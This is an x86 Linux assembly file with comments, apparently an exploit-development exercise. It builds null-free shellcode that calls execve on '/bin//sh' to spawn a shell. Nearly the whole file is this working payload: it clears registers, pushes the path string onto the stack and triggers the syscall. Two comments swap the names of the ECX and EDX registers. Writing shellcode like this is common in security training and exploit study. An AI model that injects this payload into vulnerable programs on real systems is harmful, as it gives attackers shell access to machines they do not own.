; int execve(const char *pathname, char *const argv[], char *const envp[]);
;     EAX                 EBX                 ECX                 EDX
; We can setup the two last args as NULL and pass /bin/sh as first (remeber its a filename and should end with a NULL terminator).
; We will place the syscall number of execve in EAX, and the full path of /bin/sh into EBX, a NULL in ECX and a NULL in EDX.


global _start

_start:
	xor eax, eax            ; emptying EAX so we dont have extra zeroes when crafting the shelcode from it
	mov ecx, eax            ; EDX need to be setup as NULL
	mov edx, ecx            ; ECX needs to be setup to NULL too
	mov al, 11              ; syscall value for execve(), need to be in EAX
	push edx                ; 0      => EDX contains the "\0" null terminator that will be taken after /bin//sh to produce '/bin//sh\0' 
	push 0x68732f2f         ; hs//
	push 0x6e69622f         ; nib/   => /bin//sh
	mov ebx, esp            ; after pushing /bin//sh onto the stack, ESP will point to it, we need to move it into EBX
	int 0x80                ; interrupt to trigger the system call using the value stored in EAX 
